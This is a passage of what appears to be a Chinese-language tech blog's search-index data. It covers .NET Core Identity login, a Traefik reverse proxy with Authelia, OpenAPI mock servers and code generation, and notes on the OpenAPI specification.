實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":[".Net Core"],"content":"7. 帳號登入與登出功能 這段沒有加入，登入功能無法正常，你會發現你登入都遇到失敗。結果是少這兩行，正確來說app.UseAuthentication();就可以解決。不過後續我要做登入權限設定，所以先加。 // 當帳號沒有檢查到登入資料，請確認這兩個是否加入 Middleware app.UseAuthentication(); app.UseAuthorization(); ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:1:7","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":[".Net Core"],"content":"重點知識 ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:2:0","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":[".Net Core"],"content":"UserManager,SignInManager ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:3:0","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":[".Net Core"],"content":"UserManager 控制帳號CRUD方法 CreateAsync DeleteAsync UpdateAsync ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:3:1","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":[".Net Core"],"content":"SignInManager 登入/登出判斷 SignInAsync SignOutAsync IsSignIn ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:3:2","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":[".Net Core"],"content":"記住密碼 Cookies http://localhost:50000/ 關掉瀏覽器重開需要再做登入。 有點選記住密碼，下次打開登入狀態會存在。 ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:4:0","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":[".Net Core"],"content":"感想 Net Core Identity 設定非常簡單，連帳號管理方式和驗證方式都幫你處理好了，你不必自己手寫，可以專心在別的設計上。目前我看過 Spring Boot和 Laravel 帳號管理方式，我覺得這個是最簡單的。這只是開頭，後續計入相關東西。 ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:5:0","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":[".Net Core"],"content":"相關文章 [MVC] 實作客製化的identity | 朕在coding - 點部落 ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:6:0","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":["Linux"],"content":"最近在架 KVM 使用 WebVirtCloud 做網頁遠端控制 VM，之前研究 Ubuntu 啟用 VNC 是為了能控制 VM GUI 介面，但是在公司沒法連線使用，這邊有找到 WebVirtCloud 可以解決這個問題，透過這個服務可能用 Traefik 轉服務出去，透過 Authelia 做 2FA 驗證可以相當方便，但我發現我不會轉 host 服務出去，這邊就特別研究怎麼用。 ","date":"2023-01-13","objectID":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/:0:0","tags":["linux","reverse","proxy"],"title":"Traefik 反向代理 (Reverse Proxy) IP Host 方法","uri":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"設定方法 設定 Traefik services 檔案 新增 Traefik file providers 設定 docker-compose.yml 的 Volume 重啟 docker-compose ","date":"2023-01-13","objectID":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/:1:0","tags":["linux","reverse","proxy"],"title":"Traefik 反向代理 (Reverse Proxy) IP Host 方法","uri":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"Traefik 設定 services.toml services.toml [http] [http.services] [http.services.__name__] [http.services.__name__.loadBalancer] [[http.services.__name__.loadBalancer.servers]] url = \"http://192.168.1.XX/\" [http.routers] [http.routers.__name__] tls = \"true\" rule = \"Host(`test.xxxxx.duckdns.org`)\" service = \"__name__\" __name__ 可更換名稱。相關配置可看官網文件，這邊修改就能完成。 ","date":"2023-01-13","objectID":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/:1:1","tags":["linux","reverse","proxy"],"title":"Traefik 反向代理 (Reverse Proxy) IP Host 方法","uri":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"新增 Traefik file providers 這邊可以在 traefil.yml 設定，但我選擇使用 docker-compose.yml 配置，因為我只要改一個文件就能完成所有事情。 providers: file: filename: /path/to/config/dynamic_conf.yml --providers.file.filename=/path/to/config/dynamic_conf.yml 這邊我們要改在 docker-compose 裡面的 cli。 ","date":"2023-01-13","objectID":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/:1:2","tags":["linux","reverse","proxy"],"title":"Traefik 反向代理 (Reverse Proxy) IP Host 方法","uri":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"設定 docker-compose.yml 的 Volume volumes: - /var/run/docker.sock:/var/run/docker.sock - ./acme.json:/acme.json #- ./traefik.yml:/etc/traefik/traefik.yml 因為我用 docker-compose.yml 所以就沒用這個 - ./services.toml:/etc/traefik/services.toml traefik.yml 因為我用 docker-compose.yml 所以就沒用這個。主要是 ./services.toml:/etc/traefik/services.toml。 ","date":"2023-01-13","objectID":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/:1:3","tags":["linux","reverse","proxy"],"title":"Traefik 反向代理 (Reverse Proxy) IP Host 方法","uri":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"重啟 traefik 因為架在 docker，所以重啟 docker-compose。 docker-compose down \u0026\u0026 docker-compose up -d 完成可以做簡單確認。 這邊下面我就做其他紀錄。我其他文章都有做紀錄，這邊做個懷舊紀錄。 ","date":"2023-01-13","objectID":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/:1:4","tags":["linux","reverse","proxy"],"title":"Traefik 反向代理 (Reverse Proxy) IP Host 方法","uri":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"加料 ","date":"2023-01-13","objectID":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/:2:0","tags":["linux","reverse","proxy"],"title":"Traefik 反向代理 (Reverse Proxy) IP Host 方法","uri":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"authelia 設定登入驗證 labels: - \"traefik.http.routers.vm.rule=Host(`xxx.xxxx.duckdns.org`)\" - \"traefik.http.routers.vm.tls=true\" - \"traefik.http.services.vm.loadbalancer.server.port=80\" - 'traefik.http.routers.vm.middlewares=authelia@docker' 重點是這一行- 'traefik.http.routers.vm.middlewares=authelia@docker'。但我們變成 services.toml，所以相對應設定都要調整。 [http] [http.services] [http.services.__name__] [http.services.__name__.loadBalancer] [[http.services.__name__.loadBalancer.servers]] url = \"http://192.168.1.XX/\" [http.routers] [http.routers.__name__] tls = \"true\" rule = \"Host(`test.xxxxx.duckdns.org`)\" service = \"__name__\" middlewares = \"authelia@docker\" 至於 middleware 就參考我其他片設定。這邊就不再寫了。 ","date":"2023-01-13","objectID":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/:2:1","tags":["linux","reverse","proxy"],"title":"Traefik 反向代理 (Reverse Proxy) IP Host 方法","uri":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"彩蛋 Linux 下搭建由 Go 语言基于 KVM 虚拟化开发的私有云平台 Nano - 林里克斯 Install WebVirtCloud KVM Web Dashboard on Ubuntu 20.04 | 18.04 - TechViewLeo WebVirtCloud–KVM管理工具的部署及使用详细文档 | Nes的草稿箱 ","date":"2023-01-13","objectID":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/:3:0","tags":["linux","reverse","proxy"],"title":"Traefik 反向代理 (Reverse Proxy) IP Host 方法","uri":"/blog/posts/Traefik-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-Reverse-Proxy-IP-Host-%E6%96%B9%E6%B3%95/"},{"categories":["OpenAPI"],"content":"最近研究 OpenAPI Spec 都還沒試試 Mock Api工具，這邊測試 Mockoon和prism，簡單做個心得。 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Mock-Api-%E5%B7%A5%E5%85%B7%E8%A9%A6%E7%94%A8%E5%BF%83%E5%BE%97/:0:0","tags":["openapi","mock"],"title":"OpenAPI Mock Api 工具試用心得","uri":"/blog/posts/OpenAPI-Mock-Api-%E5%B7%A5%E5%85%B7%E8%A9%A6%E7%94%A8%E5%BF%83%E5%BE%97/"},{"categories":["OpenAPI"],"content":"Mockoon 因為我現在有在 Window Server 開發，所以想找個 Window 可以直接使用的。首先我看到這個小試了一下，順便紀錄。 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Mock-Api-%E5%B7%A5%E5%85%B7%E8%A9%A6%E7%94%A8%E5%BF%83%E5%BE%97/:1:0","tags":["openapi","mock"],"title":"OpenAPI Mock Api 工具試用心得","uri":"/blog/posts/OpenAPI-Mock-Api-%E5%B7%A5%E5%85%B7%E8%A9%A6%E7%94%A8%E5%BF%83%E5%BE%97/"},{"categories":["OpenAPI"],"content":"下載與安裝 官網 Github 下載方法連結這邊可以參照官網指令做下載 官網 Github Release 也有 免安裝檔可以執行。Release API Sprout 1.3.0 · danielgtaylor/apisprout ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Mock-Api-%E5%B7%A5%E5%85%B7%E8%A9%A6%E7%94%A8%E5%BF%83%E5%BE%97/:1:1","tags":["openapi","mock"],"title":"OpenAPI Mock Api 工具試用心得","uri":"/blog/posts/OpenAPI-Mock-Api-%E5%B7%A5%E5%85%B7%E8%A9%A6%E7%94%A8%E5%BF%83%E5%BE%97/"},{"categories":["OpenAPI"],"content":"試用心得 有免安裝版真的是太方便了，這邊是用免安裝去執行的。這邊有不小心載到setup安裝，預設是一鍵安裝。也可以考慮看看。 這邊可以準備自己的 OAS 的文件。沒有的話可以用TDX OAS，連結在這邊。API OAS文本 :請點我可下載 OAS 的 JSON 文件。 參考下圖匯入 TDX.json 會跳出叫你另存環境檔。 相關回傳 JSON 訊息還可以自己定義。透過 faker 可以顯示多筆資料，請參考官網Create dynamic responses with templating。 相關注意設定: Automatic handling of CORS preflight OPTIONS requests 算是功能還滿多的工具。但我發現他不會檢查 Request 參數/Header相關東西，用 prism 會檢查參數。我覺得可以因應需求調整。 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Mock-Api-%E5%B7%A5%E5%85%B7%E8%A9%A6%E7%94%A8%E5%BF%83%E5%BE%97/:2:0","tags":["openapi","mock"],"title":"OpenAPI Mock Api 工具試用心得","uri":"/blog/posts/OpenAPI-Mock-Api-%E5%B7%A5%E5%85%B7%E8%A9%A6%E7%94%A8%E5%BF%83%E5%BE%97/"},{"categories":["OpenAPI"],"content":"prism(推薦) 直接試打一隻 API 測試，用瀏覽器會看到 http://127.0.0.1:4010/v2/Bus/RealTimeByFrequency/Streaming/City/test結果 {\"type\":\"https://stoplight.io/prism/errors#UNAUTHORIZED\",\"title\":\"Invalid security scheme used\",\"status\":401,\"detail\":\"Your request does not fullfil the security requirements and no HTTP unauthorized response was found in the spec, so Prism is generating this error for you.\",\"headers\":{\"WWW-Authenticate\":\"OAuth2\"}}。這邊推薦用 POSTMAN 測試會比較好用。 一樣也有 Window 執行檔案。指令一行解決，這邊發現近幾天還有更新，看來用這個應該還滿穩的。 #window prism-cli-win mock tdx.json prism-cli-win mock https://raw.githack.com/OAI/OpenAPI-Specification/master/examples/v3.0/petstore-expanded.yaml ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Mock-Api-%E5%B7%A5%E5%85%B7%E8%A9%A6%E7%94%A8%E5%BF%83%E5%BE%97/:2:1","tags":["openapi","mock"],"title":"OpenAPI Mock Api 工具試用心得","uri":"/blog/posts/OpenAPI-Mock-Api-%E5%B7%A5%E5%85%B7%E8%A9%A6%E7%94%A8%E5%BF%83%E5%BE%97/"},{"categories":["OpenAPI"],"content":"其他 先前找的，不過沒有測試。 danielgtaylor/apisprout: Lightweight, blazing fast, cross-platform OpenAPI 3 mock server with validation API Mocking and Testing | Microcks.io open-api-mocker - npm ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Mock-Api-%E5%B7%A5%E5%85%B7%E8%A9%A6%E7%94%A8%E5%BF%83%E5%BE%97/:3:0","tags":["openapi","mock"],"title":"OpenAPI Mock Api 工具試用心得","uri":"/blog/posts/OpenAPI-Mock-Api-%E5%B7%A5%E5%85%B7%E8%A9%A6%E7%94%A8%E5%BF%83%E5%BE%97/"},{"categories":["OpenAPI"],"content":"彩蛋 APIs.guru awesome-openapi3 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Mock-Api-%E5%B7%A5%E5%85%B7%E8%A9%A6%E7%94%A8%E5%BF%83%E5%BE%97/:4:0","tags":["openapi","mock"],"title":"OpenAPI Mock Api 工具試用心得","uri":"/blog/posts/OpenAPI-Mock-Api-%E5%B7%A5%E5%85%B7%E8%A9%A6%E7%94%A8%E5%BF%83%E5%BE%97/"},{"categories":["OpenAPI"],"content":"平常我們介接程式規格一改，我們相關串接程式都要寫程式做調整。最近研究 OpenAPI Spec 可以產生串接程式，這邊就來研究看看。 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/:0:0","tags":["openapi","generation"],"title":"OpenAPI Code Generation 產生程式碼","uri":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/"},{"categories":["OpenAPI"],"content":"管理方法 有些人不是很喜歡這個工具，認為程式產生出來程式真的跟人的感覺差很多，但其實我們人不需要管理產生出來程式，這邊產生出來獨立一包程式，這邊主專案做依賴關係，你程式包成一層Service，做程式串接。日後要調整規格，直接重新產生程式就可以了。日後想換 Code Generation 工具，直接在 Service 調整就可以方便解決這個問題。 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/:1:0","tags":["openapi","generation"],"title":"OpenAPI Code Generation 產生程式碼","uri":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/"},{"categories":["OpenAPI"],"content":"OpenAPI Generator 官方網站 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/:2:0","tags":["openapi","generation"],"title":"OpenAPI Code Generation 產生程式碼","uri":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/"},{"categories":["OpenAPI"],"content":"安裝 官網教學使用 npm 安裝，參考:Hello from OpenAPI Generator # install the latest version of \"openapi-generator-cli\" npm install @openapitools/openapi-generator-cli -g # use a specific version of \"openapi-generator-cli\" openapi-generator-cli version-manager set 6.0.0 # Or install it as dev-dependency in your node.js projects npm install @openapitools/openapi-generator-cli -D 不過我看 Github 上面寫滿多安裝方法，這邊我選擇用 Java Invoke-WebRequest -OutFile openapi-generator-cli.jar https://repo1.maven.org/maven2/org/openapitools/openapi-generator-cli/6.1.0/openapi-generator-cli-6.1.0.jar 參考:官網 Jar 安裝方式 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/:2:1","tags":["openapi","generation"],"title":"OpenAPI Code Generation 產生程式碼","uri":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/"},{"categories":["OpenAPI"],"content":"指令 # 產生連結 Java 範例程式 java -jar openapi-generator.jar generate -i https://raw.githubusercontent.com/openapitools/openapi-generator/master/modules/openapi-generator/src/test/resources/3_0/petstore.yaml -g java -o ./test/ # 產生檔案 NetCore 範例程式(和config.yaml) java -jar openapi-generator-cli.jar generate -i xxxx.yml -g csharp-dotnet2 -o ./test/ -c config.yaml ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/:2:2","tags":["openapi","generation"],"title":"OpenAPI Code Generation 產生程式碼","uri":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/"},{"categories":["OpenAPI"],"content":"支援產生程式清單 詳細官網列出還滿多，請進裡面查看。 Generators List ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/:2:3","tags":["openapi","generation"],"title":"OpenAPI Code Generation 產生程式碼","uri":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/"},{"categories":["OpenAPI"],"content":"設定檔 Generators List連結裡面有列很多程式，這邊可以選擇相關程式，裡面有各自 template 設定說明。 如Documentation for the csharp-netcore Generator就想相關設定。 config.yaml additionalProperties: targetFramework: net5.0 packageName: Com.Xxxx.Api 還算滿簡單的，這邊我有個建議，通常產生程式出來不是用來改的，是用來呼叫的。所以我覺得程式不應該人為調整，有更新再重新產生程式就可以了。 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/:2:4","tags":["openapi","generation"],"title":"OpenAPI Code Generation 產生程式碼","uri":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/"},{"categories":["OpenAPI"],"content":"TDX 文件 Generator Code(從頭實作) 下載 OpenAPI jar Invoke-WebRequest -OutFile openapi-generator-cli.jar https://repo1.maven.org/maven2/org/openapitools/openapi-generator-cli/6.1.0/openapi-generator-cli-6.1.0.jar java -jar openapi-generator-cli.jar generate -i xxxx.yml -g csharp-dotnet2 -o ./test/ -c config.yaml 因為我會有三個 config.yaml additionalProperties: targetFramework: net5.0 packageName: Com.Xxxx.Api 因為 TDX 有很多種 OpenAPI文件，所以在命名的時候需要特別注意。 java -jar openapi-generator-cli.jar generate -i .\\basic-vehicle-openapi.json -g csharp-netcore -o ./TDX/BasicVehicleV2/ -c .\\basic-vehicle-config.yaml java -jar openapi-generator-cli.jar generate -i .\\basic-administrative-openapi.json -g csharp-netcore -o ./TDX/BasicAdministrativeV2/ -c .\\basic-administrative-config.yaml java -jar openapi-generator-cli.jar generate -i .\\advanced-vehicle-openapi.json -g csharp-netcore -o ./TDX/AdvancedVehicleV2/ -c .\\advanced-vehicle-config.yaml ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/:3:0","tags":["openapi","generation"],"title":"OpenAPI Code Generation 產生程式碼","uri":"/blog/posts/OpenAPI-Code-Generation-%E7%94%A2%E7%94%9F%E7%A8%8B%E5%BC%8F%E7%A2%BC/"},{"categories":["OpenAPI"],"content":"最近規劃 API 規格打算用 OpenAPI Spec(OAS)，但真的不是很熟，所以打算文件刷一遍，這邊做個小記。 OpenAPI Specification v3.1.0 | Introduction, Definitions, \u0026 More ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:0:0","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"OpenAPI Specification (OAS) 什麼是 OpenAPI Specificatio，簡稱 OAS 一個定義 HTTP APIs 簡易規劃介面敘述語言。 可以讓人與電腦再不看原始碼情況下和解析網路封包下可以知道 API 怎麼使用 當通過OpenAPI正確定義時，消費者可以以最少的實現邏輯來理解並與遠程服務進行交互。類似於接口描述為低級別編程所做的工作，OpenAPI規範刪除了調用服務時的猜測。 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:1:0","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"價值 生產文件工具 生產程式 生產測試工具 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:1:1","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"定義 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:2:0","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"OpenAPI Document MUST 一個OpenAPI 文件必需包含 至少 paths field 至少a components field or a webhooks field 當然必須符合這些規範。 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:2:1","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"Path Templating Path Templating 是用大括號{}的template expressions來展示，URL中的路徑(URL Path)可替換成參數(URL Paramter) MUST 每個 template expression必需包含path parameter和 Path Item 或 Path Item’s Operations path item為空的話，ACL constraints, matching path parameters為非必要。 ==\u003e這句理解不能，但我猜是指下圖空直。 MUST NOT path parameters 不能包含符號。如[RFC3986]: forward slashes (/), question marks (?), or hashes (#). ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:2:2","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"Media Types 媒體類型定義分佈在幾個資源中。 SHOULD the media type 定義應該遵從 [RFC6838]規範. text/plain; charset=utf-8 application/json application/vnd.github+json application/vnd.github.v3+json application/vnd.github.v3.raw+json application/vnd.github.v3.text+json application/vnd.github.v3.html+json application/vnd.github.v3.full+json application/vnd.github.v3.diff application/vnd.github.v3.patch 003-RFC关于媒体类型说明 - bjlhx15 - 博客园 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:2:3","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"HTTP Status Codes Hypertext Transfer Protocol (HTTP) Status Code Registry ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:2:4","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"規範 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:3:0","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"Version 這邊指 OpenAPI 版本，這邊大至上有看沒懂。感覺就像是大版本小版本之類相容問題，Swagger 版本需要放三碼， ‘3.0.*’ 這個也可以用。但Swagger 工具不能用，我就不深入琢磨。 ","date":"2023-01-09","objectID":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/:3:1","tags":["openapi"],"title":"OpenAPI Spec 撰寫小記","uri":"/blog/posts/OpenAPI-Spec-%E6%92%B0%E5%AF%AB%E5%B0%8F%E8%A8%98/"},{"categories":["OpenAPI"],"content":"格式 所有 key 區分大小寫。 兩種 Field Fixed fields, which have a declared name, and Patterned fields, 